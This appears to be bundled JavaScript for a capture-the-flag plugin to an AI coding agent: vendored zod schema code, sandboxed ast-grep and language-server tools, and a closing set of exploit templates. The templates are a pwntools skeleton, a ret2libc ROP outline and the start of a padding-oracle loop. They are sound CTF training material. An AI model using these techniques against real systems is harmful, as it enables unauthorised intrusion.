  inst.multipleOf = (value, params) => inst.check(_multipleOf2(value, params));
  const bag = inst._zod.bag;
  inst.minValue = bag.minimum ?? null;
  inst.maxValue = bag.maximum ?? null;
  inst.format = bag.format ?? null;
});
function bigint5(params) {
  return _bigint2(ZodBigInt2, params);
}
var ZodBigIntFormat2 = /* @__PURE__ */ $constructor2("ZodBigIntFormat", (inst, def) => {
  $ZodBigIntFormat2.init(inst, def);
  ZodBigInt2.init(inst, def);
});
function int642(params) {
  return _int642(ZodBigIntFormat2, params);
}
function uint642(params) {
  return _uint642(ZodBigIntFormat2, params);
}
var ZodSymbol2 = /* @__PURE__ */ $constructor2("ZodSymbol", (inst, def) => {
  $ZodSymbol2.init(inst, def);
  ZodType2.init(inst, def);
});
function symbol2(params) {
  return _symbol2(ZodSymbol2, params);
}
var ZodUndefined2 = /* @__PURE__ */ $constructor2("ZodUndefined", (inst, def) => {
  $ZodUndefined2.init(inst, def);
  ZodType2.init(inst, def);
});
function _undefined6(params) {
  return _undefined5(ZodUndefined2, params);
}
var ZodNull2 = /* @__PURE__ */ $constructor2("ZodNull", (inst, def) => {
  $ZodNull2.init(inst, def);
  ZodType2.init(inst, def);
});
function _null6(params) {
  return _null5(ZodNull2, params);
}
var ZodAny2 = /* @__PURE__ */ $constructor2("ZodAny", (inst, def) => {
  $ZodAny2.init(inst, def);
  ZodType2.init(inst, def);
});
function any2() {
  return _any2(ZodAny2);
}
var ZodUnknown2 = /* @__PURE__ */ $constructor2("ZodUnknown", (inst, def) => {
  $ZodUnknown2.init(inst, def);
  ZodType2.init(inst, def);
});
function unknown2() {
  return _unknown2(ZodUnknown2);
}
var ZodNever2 = /* @__PURE__ */ $constructor2("ZodNever", (inst, def) => {
  $ZodNever2.init(inst, def);
  ZodType2.init(inst, def);
});
function never2(params) {
  return _never2(ZodNever2, params);
}
var ZodVoid2 = /* @__PURE__ */ $constructor2("ZodVoid", (inst, def) => {
  $ZodVoid2.init(inst, def);
  ZodType2.init(inst, def);
});
function _void4(params) {
  return _void3(ZodVoid2, params);
}
var ZodDate2 = /* @__PURE__ */ $constructor2("ZodDate", (inst, def) => {
  $ZodDate2.init(inst, def);
  ZodType2.init(inst, def);
  inst.min = (value, params) => inst.check(_gte2(value, params));
  inst.max = (value, params) => inst.check(_lte2(value, params));
  const c = inst._zod.bag;
  inst.minDate = c.minimum ? new Date(c.minimum) : null;
  inst.maxDate = c.maximum ? new Date(c.maximum) : null;
});
function date7(params) {
  return _date2(ZodDate2, params);
}
var ZodArray2 = /* @__PURE__ */ $constructor2("ZodArray", (inst, def) => {
  $ZodArray2.init(inst, def);
  ZodType2.init(inst, def);
  inst.element = def.element;
  inst.min = (minLength, params) => inst.check(_minLength2(minLength, params));
  inst.nonempty = (params) => inst.check(_minLength2(1, params));
  inst.max = (maxLength, params) => inst.check(_maxLength2(maxLength, params));
  inst.length = (len, params) => inst.check(_length2(len, params));
  inst.unwrap = () => inst.element;
});
function array2(element, params) {
  return _array2(ZodArray2, element, params);
}
function keyof2(schema) {
  const shape = schema._zod.def.shape;
  return _enum4(Object.keys(shape));
}
var ZodObject2 = /* @__PURE__ */ $constructor2("ZodObject", (inst, def) => {
  $ZodObjectJIT2.init(inst, def);
  ZodType2.init(inst, def);
  exports_util2.defineLazy(inst, "shape", () => def.shape);
  inst.keyof = () => _enum4(Object.keys(inst._zod.def.shape));
  inst.catchall = (catchall) => inst.clone({ ...inst._zod.def, catchall });
  inst.passthrough = () => inst.clone({ ...inst._zod.def, catchall: unknown2() });
  inst.loose = () => inst.clone({ ...inst._zod.def, catchall: unknown2() });
  inst.strict = () => inst.clone({ ...inst._zod.def, catchall: never2() });
  inst.strip = () => inst.clone({ ...inst._zod.def, catchall: undefined });
  inst.extend = (incoming) => {
    return exports_util2.extend(inst, incoming);
  };
  inst.safeExtend = (incoming) => {
    return exports_util2.safeExtend(inst, incoming);
  };
  inst.merge = (other) => exports_util2.merge(inst, other);
  inst.pick = (mask) => exports_util2.pick(inst, mask);
  inst.omit = (mask) => exports_util2.omit(inst, mask);
  inst.partial = (...args) => exports_util2.partial(ZodOptional2, inst, args[0]);
  inst.required = (...args) => exports_util2.required(ZodNonOptional2, inst, args[0]);
});
function object2(shape, params) {
  const def = {
    type: "object",
    get shape() {
      exports_util2.assignProp(this, "shape", shape ? exports_util2.objectClone(shape) : {});
      return this.shape;
    },
    ...exports_util2.normalizeParams(params)
  };
  return new ZodObject2(def);
}
function strictObject2(shape, params) {
  return new ZodObject2({
    type: "object",
    get shape() {
      exports_util2.assignProp(this, "shape", exports_util2.objectClone(shape));
      return this.shape;
    },
    catchall: never2(),
    ...exports_util2.normalizeParams(params)
  });
}
function looseObject2(shape, params) {
  return new ZodObject2({
    type: "object",
    get shape() {
      exports_util2.assignProp(this, "shape", exports_util2.objectClone(shape));
      return this.shape;
    },
    catchall: unknown2(),
    ...exports_util2.normalizeParams(params)
  });
}
var ZodUnion2 = /* @__PURE__ */ $constructor2("ZodUnion", (inst, def) => {
  $ZodUnion2.init(inst, def);
  ZodType2.init(inst, def);
  inst.options = def.options;
});
function union2(options, params) {
  return new ZodUnion2({
    type: "union",
    options,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodDiscriminatedUnion2 = /* @__PURE__ */ $constructor2("ZodDiscriminatedUnion", (inst, def) => {
  ZodUnion2.init(inst, def);
  $ZodDiscriminatedUnion2.init(inst, def);
});
function discriminatedUnion2(discriminator, options, params) {
  return new ZodDiscriminatedUnion2({
    type: "union",
    options,
    discriminator,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodIntersection2 = /* @__PURE__ */ $constructor2("ZodIntersection", (inst, def) => {
  $ZodIntersection2.init(inst, def);
  ZodType2.init(inst, def);
});
function intersection2(left, right) {
  return new ZodIntersection2({
    type: "intersection",
    left,
    right
  });
}
var ZodTuple2 = /* @__PURE__ */ $constructor2("ZodTuple", (inst, def) => {
  $ZodTuple2.init(inst, def);
  ZodType2.init(inst, def);
  inst.rest = (rest) => inst.clone({
    ...inst._zod.def,
    rest
  });
});
function tuple2(items, _paramsOrRest, _params) {
  const hasRest = _paramsOrRest instanceof $ZodType2;
  const params = hasRest ? _params : _paramsOrRest;
  const rest = hasRest ? _paramsOrRest : null;
  return new ZodTuple2({
    type: "tuple",
    items,
    rest,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodRecord2 = /* @__PURE__ */ $constructor2("ZodRecord", (inst, def) => {
  $ZodRecord2.init(inst, def);
  ZodType2.init(inst, def);
  inst.keyType = def.keyType;
  inst.valueType = def.valueType;
});
function record2(keyType, valueType, params) {
  return new ZodRecord2({
    type: "record",
    keyType,
    valueType,
    ...exports_util2.normalizeParams(params)
  });
}
function partialRecord2(keyType, valueType, params) {
  const k = clone2(keyType);
  k._zod.values = undefined;
  return new ZodRecord2({
    type: "record",
    keyType: k,
    valueType,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodMap2 = /* @__PURE__ */ $constructor2("ZodMap", (inst, def) => {
  $ZodMap2.init(inst, def);
  ZodType2.init(inst, def);
  inst.keyType = def.keyType;
  inst.valueType = def.valueType;
});
function map2(keyType, valueType, params) {
  return new ZodMap2({
    type: "map",
    keyType,
    valueType,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodSet2 = /* @__PURE__ */ $constructor2("ZodSet", (inst, def) => {
  $ZodSet2.init(inst, def);
  ZodType2.init(inst, def);
  inst.min = (...args) => inst.check(_minSize2(...args));
  inst.nonempty = (params) => inst.check(_minSize2(1, params));
  inst.max = (...args) => inst.check(_maxSize2(...args));
  inst.size = (...args) => inst.check(_size2(...args));
});
function set2(valueType, params) {
  return new ZodSet2({
    type: "set",
    valueType,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodEnum2 = /* @__PURE__ */ $constructor2("ZodEnum", (inst, def) => {
  $ZodEnum2.init(inst, def);
  ZodType2.init(inst, def);
  inst.enum = def.entries;
  inst.options = Object.values(def.entries);
  const keys = new Set(Object.keys(def.entries));
  inst.extract = (values, params) => {
    const newEntries = {};
    for (const value of values) {
      if (keys.has(value)) {
        newEntries[value] = def.entries[value];
      } else
        throw new Error(`Key ${value} not found in enum`);
    }
    return new ZodEnum2({
      ...def,
      checks: [],
      ...exports_util2.normalizeParams(params),
      entries: newEntries
    });
  };
  inst.exclude = (values, params) => {
    const newEntries = { ...def.entries };
    for (const value of values) {
      if (keys.has(value)) {
        delete newEntries[value];
      } else
        throw new Error(`Key ${value} not found in enum`);
    }
    return new ZodEnum2({
      ...def,
      checks: [],
      ...exports_util2.normalizeParams(params),
      entries: newEntries
    });
  };
});
function _enum4(values, params) {
  const entries = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
  return new ZodEnum2({
    type: "enum",
    entries,
    ...exports_util2.normalizeParams(params)
  });
}
function nativeEnum2(entries, params) {
  return new ZodEnum2({
    type: "enum",
    entries,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodLiteral2 = /* @__PURE__ */ $constructor2("ZodLiteral", (inst, def) => {
  $ZodLiteral2.init(inst, def);
  ZodType2.init(inst, def);
  inst.values = new Set(def.values);
  Object.defineProperty(inst, "value", {
    get() {
      if (def.values.length > 1) {
        throw new Error("This schema contains multiple valid literal values. Use `.values` instead.");
      }
      return def.values[0];
    }
  });
});
function literal2(value, params) {
  return new ZodLiteral2({
    type: "literal",
    values: Array.isArray(value) ? value : [value],
    ...exports_util2.normalizeParams(params)
  });
}
var ZodFile2 = /* @__PURE__ */ $constructor2("ZodFile", (inst, def) => {
  $ZodFile2.init(inst, def);
  ZodType2.init(inst, def);
  inst.min = (size, params) => inst.check(_minSize2(size, params));
  inst.max = (size, params) => inst.check(_maxSize2(size, params));
  inst.mime = (types, params) => inst.check(_mime2(Array.isArray(types) ? types : [types], params));
});
function file2(params) {
  return _file2(ZodFile2, params);
}
var ZodTransform2 = /* @__PURE__ */ $constructor2("ZodTransform", (inst, def) => {
  $ZodTransform2.init(inst, def);
  ZodType2.init(inst, def);
  inst._zod.parse = (payload, _ctx) => {
    if (_ctx.direction === "backward") {
      throw new $ZodEncodeError2(inst.constructor.name);
    }
    payload.addIssue = (issue3) => {
      if (typeof issue3 === "string") {
        payload.issues.push(exports_util2.issue(issue3, payload.value, def));
      } else {
        const _issue = issue3;
        if (_issue.fatal)
          _issue.continue = false;
        _issue.code ?? (_issue.code = "custom");
        _issue.input ?? (_issue.input = payload.value);
        _issue.inst ?? (_issue.inst = inst);
        payload.issues.push(exports_util2.issue(_issue));
      }
    };
    const output = def.transform(payload.value, payload);
    if (output instanceof Promise) {
      return output.then((output2) => {
        payload.value = output2;
        return payload;
      });
    }
    payload.value = output;
    return payload;
  };
});
function transform2(fn) {
  return new ZodTransform2({
    type: "transform",
    transform: fn
  });
}
var ZodOptional2 = /* @__PURE__ */ $constructor2("ZodOptional", (inst, def) => {
  $ZodOptional2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function optional2(innerType) {
  return new ZodOptional2({
    type: "optional",
    innerType
  });
}
var ZodNullable2 = /* @__PURE__ */ $constructor2("ZodNullable", (inst, def) => {
  $ZodNullable2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function nullable2(innerType) {
  return new ZodNullable2({
    type: "nullable",
    innerType
  });
}
function nullish4(innerType) {
  return optional2(nullable2(innerType));
}
var ZodDefault2 = /* @__PURE__ */ $constructor2("ZodDefault", (inst, def) => {
  $ZodDefault2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
  inst.removeDefault = inst.unwrap;
});
function _default4(innerType, defaultValue) {
  return new ZodDefault2({
    type: "default",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : exports_util2.shallowClone(defaultValue);
    }
  });
}
var ZodPrefault2 = /* @__PURE__ */ $constructor2("ZodPrefault", (inst, def) => {
  $ZodPrefault2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function prefault2(innerType, defaultValue) {
  return new ZodPrefault2({
    type: "prefault",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : exports_util2.shallowClone(defaultValue);
    }
  });
}
var ZodNonOptional2 = /* @__PURE__ */ $constructor2("ZodNonOptional", (inst, def) => {
  $ZodNonOptional2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function nonoptional2(innerType, params) {
  return new ZodNonOptional2({
    type: "nonoptional",
    innerType,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodSuccess2 = /* @__PURE__ */ $constructor2("ZodSuccess", (inst, def) => {
  $ZodSuccess2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function success2(innerType) {
  return new ZodSuccess2({
    type: "success",
    innerType
  });
}
var ZodCatch2 = /* @__PURE__ */ $constructor2("ZodCatch", (inst, def) => {
  $ZodCatch2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
  inst.removeCatch = inst.unwrap;
});
function _catch4(innerType, catchValue) {
  return new ZodCatch2({
    type: "catch",
    innerType,
    catchValue: typeof catchValue === "function" ? catchValue : () => catchValue
  });
}
var ZodNaN2 = /* @__PURE__ */ $constructor2("ZodNaN", (inst, def) => {
  $ZodNaN2.init(inst, def);
  ZodType2.init(inst, def);
});
function nan2(params) {
  return _nan2(ZodNaN2, params);
}
var ZodPipe2 = /* @__PURE__ */ $constructor2("ZodPipe", (inst, def) => {
  $ZodPipe2.init(inst, def);
  ZodType2.init(inst, def);
  inst.in = def.in;
  inst.out = def.out;
});
function pipe2(in_, out) {
  return new ZodPipe2({
    type: "pipe",
    in: in_,
    out
  });
}
var ZodCodec2 = /* @__PURE__ */ $constructor2("ZodCodec", (inst, def) => {
  ZodPipe2.init(inst, def);
  $ZodCodec2.init(inst, def);
});
function codec2(in_, out, params) {
  return new ZodCodec2({
    type: "pipe",
    in: in_,
    out,
    transform: params.decode,
    reverseTransform: params.encode
  });
}
var ZodReadonly2 = /* @__PURE__ */ $constructor2("ZodReadonly", (inst, def) => {
  $ZodReadonly2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function readonly2(innerType) {
  return new ZodReadonly2({
    type: "readonly",
    innerType
  });
}
var ZodTemplateLiteral2 = /* @__PURE__ */ $constructor2("ZodTemplateLiteral", (inst, def) => {
  $ZodTemplateLiteral2.init(inst, def);
  ZodType2.init(inst, def);
});
function templateLiteral2(parts, params) {
  return new ZodTemplateLiteral2({
    type: "template_literal",
    parts,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodLazy2 = /* @__PURE__ */ $constructor2("ZodLazy", (inst, def) => {
  $ZodLazy2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.getter();
});
function lazy2(getter) {
  return new ZodLazy2({
    type: "lazy",
    getter
  });
}
var ZodPromise2 = /* @__PURE__ */ $constructor2("ZodPromise", (inst, def) => {
  $ZodPromise2.init(inst, def);
  ZodType2.init(inst, def);
  inst.unwrap = () => inst._zod.def.innerType;
});
function promise2(innerType) {
  return new ZodPromise2({
    type: "promise",
    innerType
  });
}
var ZodFunction2 = /* @__PURE__ */ $constructor2("ZodFunction", (inst, def) => {
  $ZodFunction2.init(inst, def);
  ZodType2.init(inst, def);
});
function _function2(params) {
  return new ZodFunction2({
    type: "function",
    input: Array.isArray(params?.input) ? tuple2(params?.input) : params?.input ?? array2(unknown2()),
    output: params?.output ?? unknown2()
  });
}
var ZodCustom2 = /* @__PURE__ */ $constructor2("ZodCustom", (inst, def) => {
  $ZodCustom2.init(inst, def);
  ZodType2.init(inst, def);
});
function check2(fn) {
  const ch = new $ZodCheck2({
    check: "custom"
  });
  ch._zod.check = fn;
  return ch;
}
function custom2(fn, _params) {
  return _custom2(ZodCustom2, fn ?? (() => true), _params);
}
function refine2(fn, _params = {}) {
  return _refine2(ZodCustom2, fn, _params);
}
function superRefine2(fn) {
  return _superRefine2(fn);
}
function _instanceof2(cls, params = {
  error: `Input not instance of ${cls.name}`
}) {
  const inst = new ZodCustom2({
    type: "custom",
    check: "custom",
    fn: (data) => data instanceof cls,
    abort: true,
    ...exports_util2.normalizeParams(params)
  });
  inst._zod.bag.Class = cls;
  return inst;
}
var stringbool2 = (...args) => _stringbool2({
  Codec: ZodCodec2,
  Boolean: ZodBoolean2,
  String: ZodString2
}, ...args);
function json2(params) {
  const jsonSchema = lazy2(() => {
    return union2([string5(params), number5(), boolean5(), _null6(), array2(jsonSchema), record2(string5(), jsonSchema)]);
  });
  return jsonSchema;
}
function preprocess2(fn, schema) {
  return pipe2(transform2(fn), schema);
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/compat.js
var ZodIssueCode2 = {
  invalid_type: "invalid_type",
  too_big: "too_big",
  too_small: "too_small",
  invalid_format: "invalid_format",
  not_multiple_of: "not_multiple_of",
  unrecognized_keys: "unrecognized_keys",
  invalid_union: "invalid_union",
  invalid_key: "invalid_key",
  invalid_element: "invalid_element",
  invalid_value: "invalid_value",
  custom: "custom"
};
function setErrorMap2(map3) {
  config2({
    customError: map3
  });
}
function getErrorMap2() {
  return config2().customError;
}
var ZodFirstPartyTypeKind2;
(function(ZodFirstPartyTypeKind3) {})(ZodFirstPartyTypeKind2 || (ZodFirstPartyTypeKind2 = {}));
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/coerce.js
var exports_coerce2 = {};
__export(exports_coerce2, {
  string: () => string6,
  number: () => number6,
  date: () => date8,
  boolean: () => boolean6,
  bigint: () => bigint6
});
function string6(params) {
  return _coercedString2(ZodString2, params);
}
function number6(params) {
  return _coercedNumber2(ZodNumber2, params);
}
function boolean6(params) {
  return _coercedBoolean2(ZodBoolean2, params);
}
function bigint6(params) {
  return _coercedBigint2(ZodBigInt2, params);
}
function date8(params) {
  return _coercedDate2(ZodDate2, params);
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/external.js
config2(en_default2());
// node_modules/@opencode-ai/plugin/dist/tool.js
function tool(input) {
  return input;
}
tool.schema = exports_external2;
// src/tools/ast-tools.ts
import { spawn } from "child_process";
import { isAbsolute as isAbsolute2, relative, resolve as resolve2 } from "path";
var schema = tool.schema;
function isInsideRoot(root, candidatePath) {
  const rootAbs = resolve2(root);
  const targetAbs = resolve2(candidatePath);
  const rel = relative(rootAbs, targetAbs);
  if (!rel)
    return true;
  return !rel.startsWith("..") && !isAbsolute2(rel);
}
function validateSearchPaths(projectDir, paths) {
  const normalized = [];
  for (const raw of paths) {
    const p = raw.trim();
    if (!p)
      continue;
    const abs = isAbsolute2(p) ? p : resolve2(projectDir, p);
    if (!isInsideRoot(projectDir, abs)) {
      return { ok: false, reason: `path must be inside projectDir: ${p}` };
    }
    normalized.push(p);
  }
  if (normalized.length === 0) {
    return { ok: true, paths: ["."] };
  }
  return { ok: true, paths: normalized };
}
function validateGlobs(globs) {
  const normalized = [];
  for (const raw of globs ?? []) {
    const g = raw.trim();
    if (!g)
      continue;
    if (g.startsWith("/") || g.startsWith("~") || g.startsWith("..")) {
      return { ok: false, reason: `glob must be project-relative: ${g}` };
    }
    normalized.push(g);
  }
  return { ok: true, globs: normalized };
}
function buildSgRunCommand(args) {
  const cmd = [
    "npx",
    "-y",
    "-p",
    "@ast-grep/cli",
    "sg",
    "run",
    "--color",
    "never",
    "--heading",
    "never",
    "--pattern",
    args.pattern
  ];
  if (args.lang && args.lang.trim().length > 0) {
    cmd.push("--lang", args.lang.trim());
  }
  if (args.selector && args.selector.trim().length > 0) {
    cmd.push("--selector", args.selector.trim());
  }
  if (args.strictness) {
    cmd.push("--strictness", args.strictness);
  }
  if (typeof args.context === "number" && Number.isFinite(args.context) && args.context > 0) {
    cmd.push("--context", String(Math.floor(args.context)));
  }
  const globs = Array.isArray(args.globs) ? args.globs : [];
  for (const g of globs) {
    if (typeof g === "string" && g.trim().length > 0) {
      cmd.push("--globs", g.trim());
    }
  }
  if (args.rewrite !== undefined) {
    cmd.push("--rewrite", args.rewrite);
    if (args.updateAll) {
      cmd.push("--update-all");
    }
  }
  if (args.output === "json") {
    cmd.push("--json=compact");
  }
  cmd.push(...args.paths);
  return cmd;
}
function truncate(text, maxChars) {
  if (text.length <= maxChars)
    return { text, truncated: false };
  return { text: text.slice(0, maxChars), truncated: true };
}
async function runSg(params) {
  const paths = params.args.paths && params.args.paths.length > 0 ? params.args.paths : ["."];
  const cmd = buildSgRunCommand({
    pattern: params.args.pattern,
    rewrite: params.args.rewrite,
    updateAll: params.args.updateAll,
    lang: params.args.lang,
    selector: params.args.selector,
    strictness: params.args.strictness,
    context: params.args.context,
    output: params.args.output,
    globs: params.args.globs,
    paths
  });
  const child = spawn(cmd[0], cmd.slice(1), {
    cwd: params.directory,
    env: {
      ...process.env,
      CI: "true",
      NO_COLOR: "1",
      TERM: "dumb"
    },
    stdio: ["pipe", "pipe", "pipe"]
  });
  let timedOut = false;
  const killer = () => {
    try {
      if (!child.killed) {
        child.kill();
      }
    } catch {}
  };
  const timeout = setTimeout(() => {
    timedOut = true;
    killer();
  }, Math.max(100, params.timeoutMs));
  const abortListener = () => {
    killer();
  };
  if (params.abort) {
    if (params.abort.aborted) {
      killer();
    } else {
      params.abort.addEventListener("abort", abortListener, { once: true });
    }
  }
  const collect = async (stream) => {
    if (!stream)
      return Buffer.from("");
    const chunks = [];
    for await (const chunk of stream) {
      chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
    }
    return Buffer.concat(chunks);
  };
  const exited = new Promise((resolveExit) => {
    child.once("close", (code) => {
      resolveExit(typeof code === "number" ? code : 1);
    });
  });
  const [stdoutBytes, stderrBytes, exitCode] = await Promise.all([
    collect(child.stdout),
    collect(child.stderr),
    exited
  ]);
  clearTimeout(timeout);
  if (params.abort && !params.abort.aborted) {
    params.abort.removeEventListener("abort", abortListener);
  }
  const stdout = stdoutBytes.toString("utf-8");
  const stderr = stderrBytes.toString("utf-8");
  return { ok: exitCode === 0, exitCode, stdout, stderr, command: cmd, timedOut };
}
function createAstGrepTools(params) {
  const directory = params.projectDir;
  const timeoutMs = typeof params.timeoutMs === "number" && Number.isFinite(params.timeoutMs) ? params.timeoutMs : 30000;
  const MAX_OUT = 12000;
  return {
    ctf_ast_grep_search: tool({
      description: "AST-grep: search code by AST pattern (uses npx -p @ast-grep/cli)",
      args: {
        pattern: schema.string().min(1),
        lang: schema.string().optional(),
        paths: schema.array(schema.string().min(1)).optional(),
        globs: schema.array(schema.string().min(1)).optional(),
        selector: schema.string().optional(),
        strictness: schema.enum(["cst", "smart", "ast", "relaxed", "signature", "template"]).optional(),
        context: schema.number().int().min(0).max(50).optional(),
        output: schema.enum(["text", "json"]).optional()
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const validatedPaths = validateSearchPaths(directory, args.paths ?? ["."]);
        if (!validatedPaths.ok) {
          return JSON.stringify({ sessionID, ok: false, reason: validatedPaths.reason }, null, 2);
        }
        const validatedGlobs = validateGlobs(args.globs);
        if (!validatedGlobs.ok) {
          return JSON.stringify({ sessionID, ok: false, reason: validatedGlobs.reason }, null, 2);
        }
        const result = await runSg({
          directory,
          timeoutMs,
          abort: context.abort,
          args: {
            pattern: args.pattern,
            lang: args.lang,
            paths: validatedPaths.paths,
            globs: validatedGlobs.globs,
            selector: args.selector,
            strictness: args.strictness,
            context: args.context,
            output: args.output
          }
        });
        const out = truncate(result.stdout, MAX_OUT);
        const err = truncate(result.stderr, MAX_OUT);
        return JSON.stringify({
          sessionID,
          ok: result.ok,
          exitCode: result.exitCode,
          timedOut: result.timedOut,
          command: result.command,
          stdout: out.text,
          stderr: err.text,
          stdoutTruncated: out.truncated,
          stderrTruncated: err.truncated
        }, null, 2);
      }
    }),
    ctf_ast_grep_replace: tool({
      description: "AST-grep: rewrite code by AST pattern (defaults to dry-run)",
      args: {
        pattern: schema.string().min(1),
        rewrite: schema.string().min(0),
        lang: schema.string().optional(),
        paths: schema.array(schema.string().min(1)).optional(),
        globs: schema.array(schema.string().min(1)).optional(),
        selector: schema.string().optional(),
        strictness: schema.enum(["cst", "smart", "ast", "relaxed", "signature", "template"]).optional(),
        context: schema.number().int().min(0).max(50).optional(),
        apply: schema.boolean().optional(),
        output: schema.enum(["text", "json"]).optional()
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const mode = params.getMode(sessionID);
        const apply = Boolean(args.apply);
        if (apply && mode === "BOUNTY") {
          return JSON.stringify({
            sessionID,
            ok: false,
            reason: "Refusing to apply AST rewrite in BOUNTY mode. Run with apply=false for dry-run output."
          }, null, 2);
        }
        const validatedPaths = validateSearchPaths(directory, args.paths ?? ["."]);
        if (!validatedPaths.ok) {
          return JSON.stringify({ sessionID, ok: false, reason: validatedPaths.reason }, null, 2);
        }
        const validatedGlobs = validateGlobs(args.globs);
        if (!validatedGlobs.ok) {
          return JSON.stringify({ sessionID, ok: false, reason: validatedGlobs.reason }, null, 2);
        }
        const result = await runSg({
          directory,
          timeoutMs,
          abort: context.abort,
          args: {
            pattern: args.pattern,
            rewrite: args.rewrite,
            updateAll: apply,
            lang: args.lang,
            paths: validatedPaths.paths,
            globs: validatedGlobs.globs,
            selector: args.selector,
            strictness: args.strictness,
            context: args.context,
            output: args.output
          }
        });
        const out = truncate(result.stdout, MAX_OUT);
        const err = truncate(result.stderr, MAX_OUT);
        return JSON.stringify({
          sessionID,
          mode,
          apply,
          ok: result.ok,
          exitCode: result.exitCode,
          timedOut: result.timedOut,
          command: result.command,
          stdout: out.text,
          stderr: err.text,
          stdoutTruncated: out.truncated,
          stderrTruncated: err.truncated,
          note: apply ? "Applied rewrite with --update-all." : "Dry-run only. No files were modified."
        }, null, 2);
      }
    })
  };
}

// src/tools/lsp-tools.ts
var schema2 = tool.schema;
function isRecord3(value) {
  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
}
function hasError2(result) {
  if (!isRecord3(result))
    return false;
  return Boolean(result.error);
}
function extractLspApi(client) {
  const lsp = client?.lsp;
  if (!lsp || typeof lsp !== "object")
    return null;
  return lsp;
}
async function callLspOperation(client, op, directory, args) {
  const api3 = extractLspApi(client);
  const fn = api3 ? api3[op] : undefined;
  if (typeof fn !== "function") {
    return { ok: false, reason: "client.lsp operation unavailable" };
  }
  try {
    const primary = await fn({ query: { directory, ...args } });
    if (!hasError2(primary)) {
      return { ok: true, data: primary?.data ?? primary };
    }
  } catch (error92) {}
  try {
    const fallback = await fn({ directory, ...args });
    if (!hasError2(fallback)) {
      return { ok: true, data: fallback?.data ?? fallback };
    }
  } catch (error92) {
    const message = error92 instanceof Error ? error92.message : String(error92);
    return { ok: false, reason: message };
  }
  return { ok: false, reason: "unexpected lsp response" };
}
function createLspTools(params) {
  const directory = params.projectDir;
  return {
    ctf_lsp_goto_definition: tool({
      description: "LSP: go to definition",
      args: {
        filePath: schema2.string().min(1),
        line: schema2.number().int().min(1),
        character: schema2.number().int().min(0)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const result = await callLspOperation(params.client, "goToDefinition", directory, {
          filePath: args.filePath,
          line: args.line,
          character: args.character
        });
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_lsp_find_references: tool({
      description: "LSP: find references",
      args: {
        filePath: schema2.string().min(1),
        line: schema2.number().int().min(1),
        character: schema2.number().int().min(0),
        includeDeclaration: schema2.boolean().optional()
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const result = await callLspOperation(params.client, "findReferences", directory, {
          filePath: args.filePath,
          line: args.line,
          character: args.character,
          includeDeclaration: args.includeDeclaration
        });
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_lsp_diagnostics: tool({
      description: "LSP: diagnostics for a file",
      args: {
        filePath: schema2.string().min(1)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        const result = await callLspOperation(params.client, "diagnostics", directory, {
          filePath: args.filePath
        });
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    })
  };
}

// src/orchestration/exploit-templates.ts
var TEMPLATES = [
  {
    domain: "PWN",
    id: "pwntools-skeleton",
    title: "Pwntools exploit skeleton (local/remote)",
    body: [
      "```python",
      "from pwn import *",
      "",
      "context.binary = elf = ELF('./chall')",
      "context.log_level = 'info'",
      "",
      "HOST = '127.0.0.1'",
      "PORT = 1337",
      "",
      "def start(argv=[]):",
      "    if args.REMOTE:",
      "        return remote(HOST, PORT)",
      "    return process([elf.path] + argv)",
      "",
      "io = start()",
      "",
      "# TODO: trigger bug, get primitive (leak/write/control)",
      "# TODO: build payload",
      "",
      "io.interactive()",
      "```",
      "",
      "Run:",
      "- local: python3 exp.py",
      "- remote: python3 exp.py REMOTE"
    ].join(`
`)
  },
  {
    domain: "PWN",
    id: "ret2libc-outline",
    title: "ret2libc outline (leak -> libc base -> system)",
    body: [
      "```text",
      "1) Leak a libc address (puts/printf/read/write) via GOT or stack.",
      "2) Compute libc_base = leaked - libc.symbols[<fn>].",
      "3) system = libc_base + libc.symbols['system'].",
      "4) binsh = libc_base + next(libc.search(b'/bin/sh\\x00')).",
      "5) Build ROP: ret (stack align if needed) -> system(binsh).",
      "6) Verify deterministically: repeat run, then remote parity.",
      "```"
    ].join(`
`)
  },
  {
    domain: "CRYPTO",
    id: "padding-oracle-loop",
    title: "Padding oracle loop skeleton (bytewise)",
    body: [
      "```python",
      "# Skeleton: adapt to your oracle and block mode.",
      "# Goal: recover plaintext or forge a valid ciphertext using a padding oracle.",
      "",
      "def oracle(ciphertext: bytes) -> bool:",
